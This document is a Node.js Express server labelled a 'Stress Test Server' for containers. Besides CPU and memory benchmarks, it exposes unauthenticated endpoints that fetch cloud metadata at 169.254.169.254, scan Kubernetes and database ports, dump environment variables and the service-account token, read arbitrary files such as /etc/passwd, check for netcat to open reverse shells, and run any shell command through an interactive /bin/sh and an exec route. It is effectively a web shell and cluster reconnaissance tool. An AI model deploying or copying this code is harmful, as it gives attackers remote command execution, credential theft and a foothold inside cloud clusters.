const express = require('express');
const crypto = require('crypto');
const { execSync, spawn } = require('child_process');
const dns = require('dns');
const fs = require('fs');
const path = require('path');
const net = require('net');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// CPU Tests
app.get('/api/cpu/hash', (req, res) => {
    const iterations = parseInt(req.query.iterations) || 100000;
    let result = 'start';
    const start = Date.now();
    for (let i = 0; i < iterations; i++) {
        result = crypto.createHash('sha512').update(result + i).digest('hex');
    }
    res.json({ hash: result, iterations, time: Date.now() - start });
});

app.get('/api/cpu/prime', (req, res) => {
    const limit = parseInt(req.query.limit) || 100000;
    const start = Date.now();
    let primes = [];
    for (let n = 2; n <= limit; n++) {
        let isPrime = true;
        for (let i = 2; i <= Math.sqrt(n); i++) {
            if (n % i === 0) { isPrime = false; break; }
        }
        if (isPrime) primes.push(n);
    }
    res.json({ count: primes.length, last10: primes.slice(-10), time: Date.now() - start });
});

app.get('/api/cpu/fibonacci', (req, res) => {
    const n = parseInt(req.query.n) || 40;
    const start = Date.now();
    function fib(n) { return n <= 1 ? n : fib(n-1) + fib(n-2); }
    const result = fib(Math.min(n, 45));
    res.json({ n, result, time: Date.now() - start });
});

// Memory Tests
app.get('/api/memory/allocate', (req, res) => {
    const sizeMB = parseInt(req.query.size) || 100;
    const start = Date.now();
    const arr = new Array(sizeMB * 1024 * 1024 / 8).fill(Math.random());
    res.json({ allocatedMB: sizeMB, length: arr.length, time: Date.now() - start });
});

app.get('/api/memory/leak', (req, res) => {
    const count = parseInt(req.query.count) || 10000;
    global.leakedData = global.leakedData || [];
    for (let i = 0; i < count; i++) {
        global.leakedData.push({ data: crypto.randomBytes(1024).toString('hex'), ts: Date.now() });
    }
    res.json({ totalLeaked: global.leakedData.length, addedMB: (count * 2048) / 1024 / 1024 });
});

// Network Tests
app.get('/api/network/fetch', async (req, res) => {
    const url = req.query.url || 'http://169.254.169.254/latest/meta-data/';
    const start = Date.now();
    try {
        const response = await fetch(url, { signal: AbortSignal.timeout(5000) });
        const text = await response.text();
        res.json({ url, status: response.status, body: text.slice(0, 2000), time: Date.now() - start });
    } catch (e) {
        res.json({ url, error: e.message, time: Date.now() - start });
    }
});

app.get('/api/network/dns', (req, res) => {
    const host = req.query.host || 'kubernetes.default.svc.cluster.local';
    dns.resolve(host, (err, addresses) => {
        res.json({ host, addresses: addresses || [], error: err?.message });
    });
});

app.get('/api/network/scan', (req, res) => {
    const host = req.query.host || '10.100.0.1';
    const ports = [80, 443, 8080, 8443, 6443, 10250, 10255, 2379, 22, 3306, 5432, 6379, 27017];
    const results = [];
    let completed = 0;
    
    ports.forEach(port => {
        const socket = new net.Socket();
        socket.setTimeout(1000);
        socket.on('connect', () => { results.push({ port, status: 'open' }); socket.destroy(); completed++; checkDone(); });
        socket.on('timeout', () => { results.push({ port, status: 'timeout' }); socket.destroy(); completed++; checkDone(); });
        socket.on('error', () => { results.push({ port, status: 'closed' }); completed++; checkDone(); });
        socket.connect(port, host);
    });
    
    function checkDone() { if (completed === ports.length) res.json({ host, results: results.sort((a,b) => a.port - b.port) }); }
});

// System Info
app.get('/api/system/info', (req, res) => {
    try {
        const info = {
            hostname: execSync('hostname').toString().trim(),
            kernel: execSync('uname -a').toString().trim(),
            env: process.env,
            cwd: process.cwd(),
            meminfo: execSync('cat /proc/meminfo | head -10').toString(),
            cpuinfo: execSync('cat /proc/cpuinfo | grep "model name" | head -1').toString().trim(),
            mounts: execSync('mount | head -20').toString(),
            network: execSync('ip addr 2>/dev/null || ifconfig').toString(),
            processes: execSync('ps aux | head -20').toString(),
            serviceAccount: fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/token') 
                ? fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8').slice(0, 100) + '...'
                : 'Not found'
        };
        res.json(info);
    } catch (e) {
        res.json({ error: e.message });
    }
});

// File System
app.get('/api/fs/write', (req, res) => {
    const sizeMB = parseInt(req.query.size) || 10;
    const filename = '/tmp/stress_' + Date.now() + '.bin';
    const start = Date.now();
    const data = crypto.randomBytes(sizeMB * 1024 * 1024);
    fs.writeFileSync(filename, data);
    const stats = fs.statSync(filename);
    res.json({ filename, sizeMB, bytes: stats.size, time: Date.now() - start });
});

app.get('/api/fs/read', (req, res) => {
    const filepath = req.query.path || '/etc/passwd';
    try {
        const content = fs.readFileSync(filepath, 'utf8');
        res.json({ path: filepath, content: content.slice(0, 5000) });
    } catch (e) {
        res.json({ path: filepath, error: e.message });
    }
});

// Reverse Shell Check
app.get('/api/reverse/check', (req, res) => {
    try {
        const ncPath = execSync('which nc netcat 2>/dev/null || echo "not found"').toString().trim();
        const curlPath = execSync('which curl 2>/dev/null || echo "not found"').toString().trim();
        res.json({ nc: ncPath, curl: curlPath, canReverse: ncPath !== 'not found' });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// Load Test
app.get('/api/load/concurrent', async (req, res) => {
    const count = parseInt(req.query.count) || 100;
    const start = Date.now();
    const promises = [];
    for (let i = 0; i < count; i++) {
        promises.push(new Promise(resolve => {
            const hash = crypto.createHash('sha256').update(String(i)).digest('hex');
            resolve(hash);
        }));
    }
    const results = await Promise.all(promises);
    res.json({ count, time: Date.now() - start, sample: results.slice(0, 5) });
});

// ============== LIVE TERMINAL WITH SSE ==============

// Store active shells
const shells = new Map();

// Start a new shell session
app.get('/api/terminal/start', (req, res) => {
    const sessionId = crypto.randomUUID();
    const shell = spawn('/bin/sh', ['-i'], {
        cwd: '/app',
        env: { ...process.env, TERM: 'xterm', PS1: '\\w $ ' }
    });
    
    shells.set(sessionId, { shell, buffer: '' });
    
    shell.on('close', () => shells.delete(sessionId));
    shell.on('error', () => shells.delete(sessionId));
    
    res.json({ sessionId });
});

// SSE endpoint for live output
app.get('/api/terminal/stream/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = shells.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();
    
    const { shell } = session;
    
    const onData = (data) => {
        const text = data.toString();
        res.write(`data: ${JSON.stringify({ type: 'stdout', data: text })}\n\n`);
    };
    
    const onError = (data) => {
        const text = data.toString();
        res.write(`data: ${JSON.stringify({ type: 'stderr', data: text })}\n\n`);
    };
    
    const onClose = () => {
        res.write(`data: ${JSON.stringify({ type: 'exit' })}\n\n`);
        res.end();
    };
    
    shell.stdout.on('data', onData);
    shell.stderr.on('data', onError);
    shell.on('close', onClose);
    
    req.on('close', () => {
        shell.stdout.off('data', onData);
        shell.stderr.off('data', onError);
        shell.off('close', onClose);
    });
});

// Send input to shell
app.post('/api/terminal/input/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const { input } = req.body;
    const session = shells.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    session.shell.stdin.write(input);
    res.json({ ok: true });
});

// Kill shell session
app.delete('/api/terminal/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = shells.get(sessionId);
    
    if (session) {
        session.shell.kill();
        shells.delete(sessionId);
    }
    
    res.json({ ok: true });
});

// Legacy shell endpoints (keep for compatibility)
app.get('/api/shell/cd', (req, res) => {
    const dir = req.query.dir || '/';
    const cwd = req.query.cwd || '/app';
    
    try {
        let newPath;
        if (dir.startsWith('/')) newPath = dir;
        else if (dir === '..') newPath = path.dirname(cwd);
        else if (dir === '~') newPath = process.env.HOME || '/root';
        else newPath = path.join(cwd, dir);
        
        newPath = path.resolve(newPath);
        if (fs.existsSync(newPath) && fs.statSync(newPath).isDirectory()) {
            res.json({ success: true, cwd: newPath });
        } else {
            res.json({ success: false, error: 'cd: ' + dir + ': No such directory' });
        }
    } catch (e) {
        res.json({ success: false, error: e.message });
    }
});

app.post('/api/shell/exec', (req, res) => {
    const { cmd, cwd } = req.body;
    if (!cmd) return res.json({ error: 'No command provided' });
    
    try {
        const output = execSync(cmd, {
            cwd: cwd || '/app',
            timeout: 30000,
            maxBuffer: 10 * 1024 * 1024,
            encoding: 'utf8',
            shell: '/bin/sh'
        });
        res.json({ output: output || '' });
    } catch (e) {
        const output = e.stdout ? e.stdout.toString() : '';
        const error = e.stderr ? e.stderr.toString() : e.message;
        res.json({ output, error });
    }
});

app.get('/health', (req, res) => res.send('OK'));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Stress Test Server on ' + PORT));
